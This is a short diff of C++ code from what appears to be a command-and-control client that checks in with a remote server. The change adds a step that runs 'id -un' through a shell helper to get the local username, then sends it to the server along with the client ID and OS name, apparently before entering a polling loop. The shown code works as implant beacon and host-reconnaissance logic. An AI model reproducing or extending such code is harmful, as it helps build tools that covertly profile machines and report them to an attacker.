@@ -247,9 +247,11 @@ int main() {
 
     //For testing, replace with current OS
     if (os_name == "Linux") {
-        //Check in ID with server
-        string checkinwithServer = "id=" + to_string(CLIENTNUMBER) + "&os=" + 
-        os_name;
+        //Check in username, ID, and os with server
+        string username = send_to_terminal("\"id -un\"");
+        string checkinwithServer = "username=" + username + "&id=" + 
+        to_string(CLIENTNUMBER) + "&os=" + os_name;
+        //send to server
         send_data_to_server("checkIn", checkinwithServer);
 
         while(1)
